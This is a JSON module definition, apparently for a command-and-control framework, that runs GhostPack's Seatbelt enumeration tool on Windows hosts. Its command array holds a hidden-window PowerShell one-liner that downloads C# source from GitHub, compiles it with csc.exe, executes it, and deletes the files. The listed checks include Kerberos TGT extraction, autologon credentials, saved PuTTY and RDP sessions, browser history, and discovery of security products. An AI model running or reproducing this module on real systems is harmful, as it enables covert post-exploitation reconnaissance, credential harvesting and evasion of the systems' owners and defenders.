{
  "base": {
    "name": "Seatbelt",
    "type": "standard",
    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
    "credits": ["Will Schroeder (@harmj0y)"],
    "path": ["windows", "x64", "csharp", "enumeration", "Seatbelt.json"],
    "platform": "windows",
    "arch": "x64",
    "lang": "csharp",
    "privilege": false,
    "remote": "https://raw.githubusercontent.com/GhostPack/Seatbelt/master/Seatbelt/Program.cs",
    "local": ["data", "src", "GhostPack", "Seatbelt", "Seatbelt", "program.cs"],
    "options": [
      {"name": "all", "value": "", "required": false, "flag": "all", "description":"run ALL enumeration checks, can be combined with full"},
      {"name": ".NetVersion", "value": "v4.*", "required": true, "flag": "", "description":"The .Net Framework version compiler to use (i.e. v3.0, v3.5, or v4.*)"},
      {"name": "4624Events", "value": "", "required": false, "flag": "4624Events", "description":"4624 logon events from the security event log"},
      {"name": "4648Events", "value": "", "required": false, "flag": "4648Events", "description":"4648 explicit logon events from the security event log"},
      {"name": "AllTcpConnections", "value": "", "required": false, "flag": "AllTcpConnections", "description":"Lists current TCP connections and associated processes"},
      {"name": "AllUdpConnections", "value": "", "required": false, "flag": "AllUdpConnections", "description":"Lists current UDP connections and associated processes"},
      {"name": "AntiVirusWMI", "value": "", "required": false, "flag": "AntiVirusWMI", "description":"Registered antivirus (via WMI)"},
      {"name": "ARPTable", "value": "", "required": false, "flag": "ARPTable", "description":"Lists the current ARP table and adapter information (equivalent to arp -a)"},
      {"name": "AuditSettings", "value": "", "required": false, "flag": "AuditSettings", "description":"Audit settings via the registry"},
      {"name": "BasicOSInfo", "value": "", "required": false, "flag": "BasicOSInfo", "description":"Basic OS info (i.e. architecture, OS version, etc.)"},
      {"name": "CurrentDomainGroups", "value": "", "required": false, "flag": "CurrentDomainGroups", "description":"The current user's local and domain groups"},
      {"name": "DNSCache", "value": "", "required": false, "flag": "DNSCache", "description":"DNS cache entries (via WMI)"},
      {"name": "FileName", "value": "Seatbelt", "required": true, "flag": "", "description":"The filename, without the file extension, used for the resulting source code and compiled files"},
      {"name": "FirewallRules", "value": "", "required": false, "flag": "FirewallRules", "description":"Deny firewall rules, \"full\" dumps all"},
      {"name": "full", "value": "", "required": false, "flag": "full", "description":"full will prevent any filtering and will return complete results."},
      {"name": "IETabs", "value": "", "required": false, "flag": "IETabs", "description":"Open Internet Explorer tabs"},
      {"name": "InterestingFiles", "value": "", "required": false, "flag": "InterestingFiles", "description":"\"Interesting\" files matching various patterns in the user's folder"},
      {"name": "InterestingProcesses", "value": "", "required": false, "flag": "InterestingProcesses", "description":"\"Interesting\" processes- defensive products and admin tools"},
      {"name": "InternetSettings", "value": "", "required": false, "flag": "InternetSettings", "description":"Internet settings including proxy configs"},
      {"name": "KerberosTGTData", "value": "", "required": false, "flag": "KerberosTGTData", "description":"ALL TEH TGTZ!"},
      {"name": "KerberosTickets", "value": "", "required": false, "flag": "KerberosTickets", "description":"List Kerberos tickets. If elevated, grouped by all logon sessions."},
      {"name": "LapsSettings", "value": "", "required": false, "flag": "LapsSettings", "description":"LAPS settings, if installed"},
      {"name": "LocalGroupMembers", "value": "", "required": false, "flag": "LocalGroupMembers", "description":"Members of local admins, RDP, and DCOM"},
      {"name": "LogonSessions", "value": "", "required": false, "flag": "LogonSessions", "description":"User logon session data"},
      {"name": "LSASettings", "value": "", "required": false, "flag": "LSASettings", "description":"LSA settings (including auth packages)"},
      {"name": "MappedDrives", "value": "", "required": false, "flag": "MappedDrives", "description":"Mapped drives"},
      {"name": "NetworkShares", "value": "", "required": false, "flag": "NetworkShares", "description":"Network shares"},
      {"name": "NonstandardProcesses", "value": "", "required": false, "flag": "NonstandardProcesses", "description":"Processes with binary paths not in C:\\Window\\"},
      {"name": "NonstandardServices", "value": "", "required": false, "flag": "NonstandardServices", "description":"Services with binary paths not in C:\\Windows\\"},
      {"name": "Patches", "value": "", "required": false, "flag": "Patches", "description":"Installed patches via WMI (takes a bit on some systems)"},
      {"name": "PowerShellSettings", "value": "", "required": false, "flag": "PowerShellSettings", "description":"PowerShell versions and security settings"},
      {"name": "PuttySessions", "value": "", "required": false, "flag": "PuttySessions", "description":"Interesting settings from any saved Putty configurations"},
      {"name": "PuttySSHHostKeys", "value": "", "required": false, "flag": "PuttySSHHostKeys", "description":"Saved putty SSH host keys"},
      {"name": "RDPSessions", "value": "", "required": false, "flag": "RDPSessions", "description":"Current incoming RDP sessions"},
      {"name": "RebootSchedule", "value": "", "required": false, "flag": "RebootSchedule", "description":"Reboot schedule (last 15 days) based on event IDs 12 and 13"},
      {"name": "RecentFiles", "value": "", "required": false, "flag": "RecentFiles", "description":"Parsed \"recent files\" shortcuts (last 7 days)"},
      {"name": "RecentRunCommands", "value": "", "required": false, "flag": "RecentRunCommands", "description":"Recent \"run\" commands"},
      {"name": "RecycleBin", "value": "", "required": false, "flag": "RecycleBin", "description":"Items in the Recycle Bin deleted in the last 30 days - only works from a user context!"},
      {"name": "RegistryAutoLogon", "value": "", "required": false, "flag": "RegistryAutoLogon", "description":"Registry autologon information"},
      {"name": "RegistryAutoRuns", "value": "", "required": false, "flag": "RegistryAutoRuns", "description":"Registry autoruns"},
      {"name": "SavedRDPConnections", "value": "", "required": false, "flag": "SavedRDPConnections", "description":"Saved RDP connections"},
      {"name": "SysmonConfig", "value": "", "required": false, "flag": "SysmonConfig", "description":"Sysmon configuration from the registry"},
      {"name": "SystemEnvVariables", "value": "", "required": false, "flag": "SystemEnvVariables ", "description":"Current system environment variables"},
      {"name": "TokenGroupPrivs", "value": "", "required": false, "flag": "TokenGroupPrivs", "description":"Current process/token privileges (e.g. SeDebugPrivilege/etc.)"},
      {"name": "TriageChrome", "value": "", "required": false, "flag": "TriageChrome", "description":"Chrome bookmarks and history"},
      {"name": "TriageFirefox", "value": "", "required": false, "flag": "TriageFirefox", "description":"Firefox history (no bookmarks)"},
      {"name": "TriageIE", "value": "", "required": false, "flag": "TriageIE", "description":"Internet Explorer bookmarks and history (last 7 days)"},
      {"name": "UACSystemPolicies", "value": "", "required": false, "flag": "UACSystemPolicies", "description":"UAC system policies via the registry"},
      {"name": "UserEnvVariables", "value": "", "required": false, "flag": "UserEnvVariables", "description":"Current user environment variables"},
      {"name": "UserFolders", "value": "", "required": false, "flag": "UserFolders", "description":"Folders in C:\\Users\\"},
      {"name": "WEFSettings", "value": "", "required": false, "flag": "WEFSettings", "description":"Windows Event Forwarding (WEF) settings via the registry"},
      {"name": "WMIMappedDrives", "value": "", "required": false, "flag": "WMIMappedDrives", "description":"Mapped drives via WMI"}
    ],
    "description": "Seatbelt is a C# project that performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives.  This module downloads the project's C# source code, compiles it with .Net's csc.exe, executes it, and then deletes the files.",
    "notes": "\r\n\t-Seatbelt was created by Will Schroeder (@harmj0y) and is part of the ðŸ‘» GhostPack tool set: https://github.com/GhostPack/Seatbelt\r\n\t-SeatBelt.exe [CheckName] full will prevent any filtering and will return complete results.\r\n\t-SeatBelt.exe [CheckName] [CheckName2] ... will run one or more specified checks only (case-sensitive naming!)\r\n\t-All options are either marked as true or a blank string\r\n\t-@andrewchiles' HostEnum.ps1 script and @tifkin_'s Get-HostProfile.ps1 provided inspiration for many of the artifacts to collect.",
    "commands": [
      "powershell.exe",
      "-nop",
      "-w 1",
      "\"",
      "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/Seatbelt/master/Seatbelt/Program.cs', $env:APPDATA+'\\\\{{FileName.Value}}.cs');",
      "$f=(Get-Content $env:APPDATA\\\\{{FileName.Value}}.cs);",
      "$f=($f -replace 'UInt32','uint');",
      "$f=($f -replace 'UInt64','ulong');",
      "Set-Content -Path $env:APPDATA\\\\{{FileName.Value}}.cs $f;",
      "c:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\{{.NetVersion.Value}}\\\\csc.exe /unsafe /nowarn:0649 /out:$env:APPDATA\\\\{{FileName.Value}}.exe $env:APPDATA\\\\{{FileName.Value}}.cs;",
      "&$env:APPDATA\\\\{{FileName.Value}}.exe",
      "{{all.Flag}}",
      "{{4624Events.Flag}}",
      "{{4648Events.Flag}}",
      "{{AllTcpConnections.Flag}}",
      "{{AllUdpConnections.Flag}}",
      "{{AntiVirusWMI.Flag}}",
      "{{ARPTable.Flag}}",
      "{{AuditSettings.Flag}}",
      "{{BasicOSInfo.Flag}}",
      "{{CurrentDomainGroups.Flag}}",
      "{{DNSCache.Flag}}",
      "{{FirewallRules.Flag}}",
      "{{full.Flag}}",
      "{{IETabs.Flag}}",
      "{{InterestingFiles.Flag}}",
      "{{InterestingProcesses.Flag}}",
      "{{InternetSettings.Flag}}",
      "{{KerberosTGTData.Flag}}",
      "{{KerberosTickets.Flag}}",
      "{{LapsSettings.Flag}}",
      "{{LocalGroupMembers.Flag}}",
      "{{LogonSessions.Flag}}",
      "{{LSASettings.Flag}}",
      "{{MappedDrives.Flag}}",
      "{{NetworkShares.Flag}}",
      "{{NonstandardProcesses.Flag}}",
      "{{NonstandardServices.Flag}}",
      "{{Patches.Flag}}",
      "{{PowerShellSettings.Flag}}",
      "{{PuttySessions.Flag}}",
      "{{PuttySSHHostKeys.Flag}}",
      "{{RDPSessions.Flag}}",
      "{{RebootSchedule.Flag}}",
      "{{RecentFiles.Flag}}",
      "{{RecentRunCommands.Flag}}",
      "{{RecycleBin.Flag}}",
      "{{RegistryAutoLogon.Flag}}",
      "{{RegistryAutoRuns.Flag}}",
      "{{SavedRDPConnections.Flag}}",
      "{{SysmonConfig.Flag}}",
      "{{SystemEnvVariables.Flag}}",
      "{{TokenGroupPrivs.Flag}}",
      "{{TriageChrome.Flag}}",
      "{{TriageFirefox.Flag}}",
      "{{TriageIE.Flag}}",
      "{{UACSystemPolicies.Flag}}",
      "{{UserEnvVariables.Flag}}",
      "{{UserFolders.Flag}}",
      "{{WEFSettings.Flag}}",
      "{{WMIMappedDrives.Flag}}",
      ";del $env:APPDATA\\\\{{FileName.Value}}.*",
      "\""
    ]
  }
}